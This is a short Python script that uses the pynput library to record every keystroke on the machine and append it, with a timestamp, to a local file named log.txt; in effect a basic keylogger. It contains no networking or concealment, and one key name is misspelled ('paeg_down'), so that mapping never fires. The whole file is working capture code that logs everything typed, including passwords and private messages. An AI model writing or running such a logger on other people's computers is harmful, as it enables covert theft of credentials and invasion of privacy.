from pynput.keyboard import Listener
import datetime
with open('log.txt','a') as f:
    f.write('\n\nDate-Time:'+str(datetime.datetime.now()).replace("'","")+'\n')
def writetofile(key):
    letter=str(key)
    letter=letter.replace("'","")
    if letter=='Key.space':
        letter=' '
    if letter=='Key.tab':
        letter='\t'
    if letter=='Key.up':
        letter='up'
    if letter=='Key.down':
        letter='down'
    if letter=='Key.left':
        letter='left'
    if letter=='Key.right':
        letter='right'
    if letter=='Key.shift':
        letter=''
    if letter=='Key.shift_l':
        letter=''
    if letter=='Key.shift_r':
        letter=''
    if letter=='Key.scroll_lock':
        letter='scroll_lock'
    if letter=='Key.print_screen':
        letter='print_screen'
    if letter=='Key.pause':
        letter='pause'
    if letter=='Key.page_up':
        letter='page_up'
    if letter=='Key.paeg_down':
        letter='page_down'
    if letter=='Key.num_lock':
        letter='num_lock'
    if letter=='Key.menu':
        letter='menu'
    if letter=='Key.insert':
        letter='insert'
    if letter=='Key.home':
        letter='home'
    if letter=='Key.f1':
        letter='f1'
    if letter=='Key.f2':
        letter='f2'
    if letter=='Key.f3':
        letter='f3'
    if letter=='Key.f4':
        letter='f4'
    if letter=='Key.f5':
        letter='f5'
    if letter=='Key.f6':
        letter='f6'
    if letter=='Key.f7':
        letter='f7'
    if letter=='Key.f8':
        letter='f8'
    if letter=='Key.f9':
        letter='f9'
    if letter=='Key.f10':
        letter='f10'
    if letter=='Key.f11':
        letter='f11'
    if letter=='Key.f12':
        letter='f12'
    if letter=='Key.esc':
        letter='esc'
    if letter=='Key.enter':
        letter='\n'
    if letter=='Key.end':
        letter='end'
    if letter=='Key.delete':
        letter='del'
    if letter=='Key.ctrl':
        letter='ctrl'
    if letter=='Key.ctrl_l':
        letter='ctrl_l'
    if letter=='Key.ctrl_r':
        letter='ctrl_r'
    if letter=='Key.cmd':
        letter='cmd'
    if letter=='Key.cmd_l':
        letter='cmd_l'
    if letter=='Key.cmd_r':
        letter='cmd_r'
    if letter=='Key.alt':
        letter='alt'
    if letter=='Key.alt_l':
        letter='alt_l'
    if letter=='Key.alt_r':
        letter='alt_r'
    if letter=='Key.alt_gr':
        letter='alt_gr'
    if letter=='Key.caps_lock':
        letter='caps'
    if letter=='Key.backspace':
        letter='back'
        
    with open('log.txt','a') as f:
        f.write(letter)
with Listener(on_press=writetofile) as l:
    l.join()
